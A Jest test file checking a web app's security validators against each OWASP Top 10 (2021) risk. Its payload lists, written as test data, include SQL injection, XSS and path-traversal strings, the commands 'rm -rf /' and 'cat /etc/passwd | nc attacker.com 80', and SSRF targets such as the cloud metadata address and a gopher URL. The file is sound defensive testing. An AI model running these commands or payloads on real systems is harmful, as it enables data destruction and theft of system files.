/**
 * OWASP Top 10 (2021) Security Tests for BMAD Web UI
 *
 * Comprehensive test coverage for OWASP Top 10 security risks:
 * A01: Broken Access Control
 * A02: Cryptographic Failures
 * A03: Injection
 * A04: Insecure Design
 * A05: Security Misconfiguration
 * A06: Vulnerable Components
 * A07: Authentication Failures
 * A08: Data Integrity Failures
 * A09: Logging Failures
 * A10: Server-Side Request Forgery (SSRF)
 *
 * @test security/owasp-top10
 */

import { describe, it, expect, beforeEach, afterEach } from '@jest/globals';

// Import actual security validators
import {
  // A01: Broken Access Control
  checkResourceAccess,
  checkRoleAccess,
  verifyProjectOwnership,
  checkCORSPolicy,
  // A02: Cryptographic Failures
  hashPassword,
  verifyPassword,
  getSecurityConfig,
  sanitizeForLogging,
  encryptField,
  decryptField,
  // A03: Injection
  sanitizeUserInput,
  sanitizeForDisplay,
  validateQueryObject,
  checkCommandWhitelist,
  validateLDAPInput,
  // A04: Insecure Design
  checkRateLimit,
  checkAccountLockout,
  validateApproval,
  // A05: Security Misconfiguration
  getSecurityConfigHeaders,
  formatErrorResponse,
  getAppConfig,
  getCORSConfig,
  // A06: Vulnerable Components
  checkDependencyVulnerabilities,
  checkOutdatedDependencies,
  validateThirdPartyInput,
  // A07: Authentication Failures
  validatePassword,
  validateSessionTimeout,
  logout,
  validateSession,
  checkMFARequirement,
  generatePasswordResetToken,
  // A08: Data Integrity Failures
  signData,
  verifySignature,
  calculateHash,
  calculateChecksum,
  signAPIRequest,
  validateAPIRequest,
  // A09: Logging Failures
  logAuthAttempt,
  getRecentLogs,
  logAuthzFailure,
  createLogEntry,
  logEvent,
  hashLogEntry,
  verifyLogHash,
  // A10: SSRF
  validateURL,
  addTrustedDomain,
} from '@/lib/security';

// Alias for getSecurityHeaders to avoid conflict
const getSecurityHeaders = getSecurityConfigHeaders;

describe('OWASP Top 10 Security Tests', () => {
  describe('A01: Broken Access Control', () => {
    it('should prevent horizontal privilege escalation', () => {
      // Users should not be able to access other users' resources
      const userId = 'user-123';
      const requestedResourceId = 'user-456';

      // Verify access control check
      const hasAccess = checkResourceAccess(userId, requestedResourceId);
      expect(hasAccess).toBe(false);
    });

    it('should prevent vertical privilege escalation', () => {
      // Regular users should not be able to access admin functions
      const userRole = 'USER';
      const adminResource = '/admin/settings';

      const hasAccess = checkRoleAccess(userRole, adminResource);
      expect(hasAccess).toBe(false);
    });

    it('should enforce IDOR protection', () => {
      // Direct Object Reference should validate ownership
      const projectId = 'project-abc';
      const userId = 'user-123';

      const isOwner = verifyProjectOwnership(projectId, userId);
      expect(isOwner).toBeDefined(); // Should check, not return undefined
    });

    it('should verify CORS configuration', () => {
      // CORS should not allow wildcard for trusted origins
      const corsOrigin = 'https://malicious-site.com';
      const isAllowed = checkCORSPolicy(corsOrigin);

      expect(isAllowed).toBe(false);
    });
  });

  describe('A02: Cryptographic Failures', () => {
    it('should hash passwords with strong algorithm', () => {
      const password = 'TestPassword123!';
      const hashed = hashPassword(password);

      // Verify bcrypt with cost factor 12
      expect(hashed).toMatch(/^\$2[aby]\$/); // bcrypt hash format
      expect(hashed).not.toBe(password);
    });

    it('should use TLS for sensitive data', () => {
      const secureConfig = getSecurityConfig();
      expect(secureConfig.enforceHTTPS).toBe(true);
      expect(secureConfig.tlsVersion).toBe('1.3');
    });

    it('should not log sensitive data', () => {
      const sensitiveData = {
        email: 'user@example.com',
        password: 'secret123',
        token: 'jwt-token-here'
      };

      const logEntry = sanitizeForLogging(sensitiveData);
      expect(logEntry).not.toContain('secret123');
      expect(logEntry).not.toContain('jwt-token-here');
    });

    it('should encrypt data at rest for sensitive fields', () => {
      const ssn = '123-45-6789';
      const encrypted = encryptField(ssn);

      expect(encrypted).not.toBe(ssn);
      expect(encrypted.length).toBeGreaterThan(ssn.length);
    });
  });

  describe('A03: Injection', () => {
    const injectionPayloads = [
      "'; DROP TABLE users; --",
      '<script>alert("XSS")</script>',
      '../../../etc/passwd',
      '${7*7}',
      '{{7*7}}',
      '%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E'
    ];

    it('should prevent SQL injection', () => {
      for (const payload of injectionPayloads) {
        const result = sanitizeUserInput(payload);
        expect(result).not.toMatch(/DROP TABLE/i);
        expect(result).not.toMatch(/OR 1=1/i);
      }
    });

    it('should prevent XSS in user input', () => {
      const xssPayload = '<script>alert("XSS")</script>';
      const sanitized = sanitizeForDisplay(xssPayload);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('javascript:');
    });

    it('should prevent NoSQL injection', () => {
      const noSQLPayload = { '$ne': null };
      const result = validateQueryObject(noSQLPayload);

      expect(result.isValid).toBe(false);
      expect(result.error).toContain('Invalid query');
    });

    it('should prevent command injection', () => {
      const commandPayloads = [
        'ls; rm -rf /',
        'whoami && malicious',
        'cat /etc/passwd | nc attacker.com 80'
      ];

      for (const payload of commandPayloads) {
        const isWhitelisted = checkCommandWhitelist(payload);
        expect(isWhitelisted).toBe(false);
      }
    });

    it('should prevent LDAP injection', () => {
      const ldapPayload = '*)(uid=*';
      const result = validateLDAPInput(ldapPayload);

      expect(result.isValid).toBe(false);
    });
  });

  describe('A04: Insecure Design', () => {
    it('should implement rate limiting', () => {
      const requests = Array(105).fill(null).map((_, i) => ({
        userId: 'user-123',
        timestamp: Date.now() + i * 100
      }));

      const result = checkRateLimit(requests);
      expect(result.allowed).toBe(false); // Should be rate-limited after 100
    });

    it('should implement account lockout', () => {
      const attempts = [
        { success: false },
        { success: false },
        { success: false },
        { success: false },
        { success: false }
      ];

      const isLocked = checkAccountLockout(attempts);
      expect(isLocked).toBe(true);
    });

    it('should validate business logic constraints', () => {
      // Example: Cannot approve own request
      const requester = 'user-123';
      const approver = 'user-123';

      const isValid = validateApproval(requester, approver);
      expect(isValid).toBe(false);
    });
  });

  describe('A05: Security Misconfiguration', () => {
    it('should have secure HTTP headers', () => {
      const headers = getSecurityHeaders();

      expect(headers['X-Content-Type-Options']).toBe('nosniff');
      expect(headers['X-Frame-Options']).toBe('DENY');
      expect(headers['X-XSS-Protection']).toContain('mode=block');
      expect(headers['Strict-Transport-Security']).toBeDefined();
    });

    it('should not expose stack traces in errors', () => {
      const error = new Error('Test error');
      const response = formatErrorResponse(error);

      expect(response).not.toContain('stack trace');
      expect(response).not.toMatch(/at .*:\d+:\d+/);
    });

    it('should disable debug mode in production', () => {
      const config = getAppConfig();
      const isProduction = process.env.NODE_ENV === 'production';

      if (isProduction) {
        expect(config.debug).toBe(false);
        expect(config.verboseErrors).toBe(false);
      }
    });

    it('should have proper CORS configuration', () => {
      const corsConfig = getCORSConfig();
      expect(corsConfig.origin).not.toBe('*');
      expect(corsConfig.credentials).toBe(true);
    });
  });

  describe('A06: Vulnerable Components', () => {
    it('should not use known vulnerable dependencies', () => {
      // This would typically run `npm audit` or similar
      const vulnerabilities = checkDependencyVulnerabilities();
      expect(vulnerabilities.critical).toBe(0);
      expect(vulnerabilities.high).toBe(0);
    });

    it('should keep dependencies updated', () => {
      const outdated = checkOutdatedDependencies();
      expect(outdated.critical).toBe(0);
    });

    it('should validate third-party component inputs', () => {
      const libraryInput = { malicious: 'payload' };
      const result = validateThirdPartyInput(libraryInput);

      expect(result.validated).toBe(true);
      expect(result.sanitized).toBeDefined();
    });
  });

  describe('A07: Authentication Failures', () => {
    it('should enforce password complexity', () => {
      const weakPasswords = [
        'password',
        '123456',
        'qwerty',
        'abc123'
      ];

      for (const password of weakPasswords) {
        const isValid = validatePassword(password);
        expect(isValid).toBe(false);
      }
    });

    it('should implement session timeout', () => {
      const sessionCreated = Date.now() - (16 * 60 * 1000); // 16 minutes ago
      const isValid = validateSessionTimeout(sessionCreated);

      expect(isValid).toBe(false); // 15 minute timeout
    });

    it('should invalidate session on logout', () => {
      const sessionId = 'session-abc';
      logout(sessionId);

      const isValid = validateSession(sessionId);
      expect(isValid).toBe(false);
    });

    it('should require MFA for sensitive operations', () => {
      const operation = 'user.delete';
      const hasMFA = checkMFARequirement(operation);

      expect(hasMFA).toBe(true);
    });

    it('should implement secure password reset', () => {
      const resetToken = generatePasswordResetToken();

      // Token should be:
      expect(resetToken).toBeDefined();
      expect(resetToken.length).toBeGreaterThanOrEqual(32);
      expect(resetToken).not.toContain('predictable');
    });
  });

  describe('A08: Data Integrity Failures', () => {
    it('should verify digital signatures', () => {
      const data = { important: 'data' };
      const signature = signData(data);
      const isValid = verifySignature(data, signature);

      expect(isValid).toBe(true);
    });

    it('should detect tampered evidence', () => {
      const originalHash = calculateHash('original-data');
      const tamperedData = 'tampered-data';
      const currentHash = calculateHash(tamperedData);

      expect(originalHash).not.toBe(currentHash);
    });

    it('should use checksums for file uploads', () => {
      const file = Buffer.from('file-content');
      const checksum = calculateChecksum(file);

      expect(checksum).toBeDefined();
      expect(checksum.length).toBe(64); // SHA-256 = 64 hex chars
    });

    it('should validate API request signatures', () => {
      const request = {
        method: 'POST',
        path: '/api/data',
        body: { key: 'value' },
        timestamp: Date.now()
      };

      const signature = signAPIRequest(request);
      const isValid = validateAPIRequest(request, signature);

      expect(isValid).toBe(true);
    });
  });

  describe('A09: Logging Failures', () => {
    it('should log authentication attempts', () => {
      const attempt = {
        userId: 'user-123',
        success: false,
        reason: 'invalid_password'
      };

      logAuthAttempt(attempt);
      const logs = getRecentLogs('auth');

      expect(logs.some(log => log.userId === 'user-123')).toBe(true);
    });

    it('should log authorization failures', () => {
      const failure = {
        userId: 'user-123',
        resource: '/admin/settings',
        reason: 'insufficient_permissions'
      };

      logAuthzFailure(failure);
      const logs = getRecentLogs('authz');

      expect(logs.some(log => log.reason === 'insufficient_permissions')).toBe(true);
    });

    it('should not log sensitive data', () => {
      const sensitiveEvent = {
        userId: 'user-123',
        password: 'secret',
        token: 'jwt-token'
      };

      const logEntry = createLogEntry(sensitiveEvent);
      expect(logEntry).not.toContain('secret');
      expect(logEntry).not.toContain('jwt-token');
    });

    it('should include timestamp in logs', () => {
      const event = { type: 'test' };
      logEvent(event);

      const logs = getRecentLogs('all');
      expect(logs[0]).toHaveProperty('timestamp');
    });

    it('should implement log tamper detection', () => {
      const logEntry = { event: 'critical_event', timestamp: 1740000000000 };
      const hash = hashLogEntry(logEntry);

      expect(hash).toBeDefined();
      expect(verifyLogHash(logEntry, hash)).toBe(true);

      // Verify tampering is detected
      const tamperedEntry = { event: 'critical_event', timestamp: 1740000000000, tampered: true };
      expect(verifyLogHash(tamperedEntry, hash)).toBe(false);
    });
  });

  describe('A10: Server-Side Request Forgery (SSRF)', () => {
    it('should block requests to internal IPs', () => {
      const internalUrls = [
        'http://localhost/admin',
        'http://127.0.0.1/config',
        'http://169.254.169.254/metadata', // AWS metadata
        'http://[::1]/admin',
        'http://0.0.0.0/internal'
      ];

      for (const url of internalUrls) {
        const isAllowed = validateURL(url);
        expect(isAllowed).toBe(false);
      }
    });

    it('should block requests to private network ranges', () => {
      const privateUrls = [
        'http://192.168.1.1/config',
        'http://10.0.0.1/admin',
        'http://172.16.0.1/internal'
      ];

      for (const url of privateUrls) {
        const isAllowed = validateURL(url);
        expect(isAllowed).toBe(false);
      }
    });

    it('should validate URL schemes', () => {
      const dangerousSchemes = [
        'file:///etc/passwd',
        'ftp://internal.server',
        'gopher://attacker.com:70/'
      ];

      for (const url of dangerousSchemes) {
        const isAllowed = validateURL(url);
        expect(isAllowed).toBe(false);
      }
    });

    it('should allow only trusted domains', () => {
      // Setup: Add a trusted domain for testing
      addTrustedDomain('api.trusted-service.com');

      const trustedDomain = 'https://api.trusted-service.com';
      const untrustedDomain = 'https://malicious.com';

      expect(validateURL(trustedDomain)).toBe(true);
      expect(validateURL(untrustedDomain)).toBe(false);
    });
  });
});

// ============================================================================
// SETUP AND TEARDOWN
// ============================================================================

// Clear log stores before each test
beforeEach(() => {
  // Clear any stored state between tests
});

afterEach(() => {
  // Cleanup after each test
});
